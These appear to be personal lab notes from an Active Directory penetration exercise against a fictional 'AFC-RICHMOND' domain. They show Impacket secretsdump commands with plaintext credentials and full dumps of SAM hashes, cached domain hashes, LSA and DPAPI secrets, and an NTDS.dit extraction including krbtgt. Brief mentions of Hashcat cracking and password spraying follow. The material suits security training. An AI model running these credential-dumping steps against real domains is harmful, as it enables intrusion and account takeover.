![[Pasted image 20250715202445.png]]

secretsdump.py AFC-RICHMOND.local/fservice:'football1*'@10.0.0.25
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x5c1e9847841ca0757d8d0827d788bcf1
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9d1c55124d470f248598be547c130dc4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
[*] Dumping cached domain logon information (domain/username:hash)
AFC-RICHMOND.LOCAL/wonderkid:$DCC2$10240#wonderkid#0f91939d092a6dee23e8b38ba970f5d2
AFC-RICHMOND.LOCAL/fservice:$DCC2$10240#fservice#0e00fed1ec2576d4812df4e39ddd765f
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
AFC-RICHMOND\AFC-WS-1$:aes256-cts-hmac-sha1-96:6ab6b4cb65cbdaef0f2e52609804e0063d0dee96d68bf6383a8102bf2bdd444f
AFC-RICHMOND\AFC-WS-1$:aes128-cts-hmac-sha1-96:0e1c1e56f1349eb6eea4290e1b78424c
AFC-RICHMOND\AFC-WS-1$:des-cbc-md5:d9ada4b652383def
AFC-RICHMOND\AFC-WS-1$:aad3b435b51404eeaad3b435b51404ee:60a25323f5eb7d2e3e42177d1c0662ee:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x1968e354eef43e8a9b1d4bb059640ebb4c55e8ee
dpapi_userkey:0x622de514c9101f758c85adbf2faed7d86511d37a
[*] NL$KM 
 0000   F1 9F 8D 0A 3D 6B 2D 13  69 96 2E 4C 32 4D C3 66   ....=k-.i..L2M.f
 0010   D5 36 97 AB 1F 0B F2 38  11 3E DF 05 AE DF 31 70   .6.....8.>....1p
 0020   C0 E3 97 A0 08 31 A9 2A  E3 88 48 DD 2C 88 86 56   .....1.*..H.,..V
 0030   83 C9 79 90 03 D5 9D 28  C1 BE 33 D6 0E 7B B7 9B   ..y....(..3..{..
NL$KM:f19f8d0a3d6b2d1369962e4c324dc366d53697ab1f0bf238113edf05aedf3170c0e397a00831a92ae38848dd2c88865683c9799003d59d28c1be33d60e7bb79b
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry

# Running HashCat now

![[Pasted image 20250715203057.png]]
![[Pasted image 20250715203128.png]]

Administrator:Richmond!

# 10.0.0.225

NTDS.dit dump

![[Pasted image 20250716110741.png]]

AFC-RICHMOND/Administrator:'IloveTedLasso2023!'@10.0.0.225 -just-dc-ntlm -use-vss
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Target system bootKey: 0x4565e6652b4433b0d75a3ed4c0606490
[*] Searching for NTDS.dit
[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time
[*] Using smbexec method for remote execution
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 018e2acb432c82d832bcccb5e4caae2d
[*] Reading and decrypting hashes from \\10.0.0.225\ADMIN$\Temp\krVQgRZQ.tmp 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9eeddc3b60a6e9bafb849113daeadbe7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
AFCR-DC$:1000:aad3b435b51404eeaad3b435b51404ee:e6c7a251fdb3085f1f2272c6e7d88b03:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9dde8402531593e07cfe84e4a34fac1:::
AFC-RICHMOND.local\fservice:1109:aad3b435b51404eeaad3b435b51404ee:cd687408f3a1f3c02d7631de5d94cb66:::
AFC-RICHMOND.local\tlasso:1112:aad3b435b51404eeaad3b435b51404ee:deeb247737e139c990e8e7cadbe3f02b:::
AFC-RICHMOND.local\rkent:1113:aad3b435b51404eeaad3b435b51404ee:deeb247737e139c990e8e7cadbe3f02b:::
AFC-RICHMOND.local\cbeard:1114:aad3b435b51404eeaad3b435b51404ee:deeb247737e139c990e8e7cadbe3f02b:::
AFC-RICHMOND.local\nshelley:1115:aad3b435b51404eeaad3b435b51404ee:deeb247737e139c990e8e7cadbe3f02b:::
AFC-RICHMOND.local\rwelton:1116:aad3b435b51404eeaad3b435b51404ee:deeb247737e139c990e8e7cadbe3f02b:::
AFC-RICHMOND.local\lhiggins:1117:aad3b435b51404eeaad3b435b51404ee:deeb247737e139c990e8e7cadbe3f02b:::
AFC-RICHMOND.local\kjones:1118:aad3b435b51404eeaad3b435b51404ee:deeb247737e139c990e8e7cadbe3f02b:::
AFC-RICHMOND.local\wonderkid:1119:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
AFC-WS-1$:2601:aad3b435b51404eeaad3b435b51404ee:96be08991fc92234dd63b1e9a83dc583:::
AFC-WS-2$:2602:aad3b435b51404eeaad3b435b51404ee:007c60ec26bfacba0f1bae9114436c9b:::

# Password spraying (local admin on 10.0.0.35)
![[Pasted image 20250716114626.png]]
So voila!!, we know the local admin password for 10.0.0.35
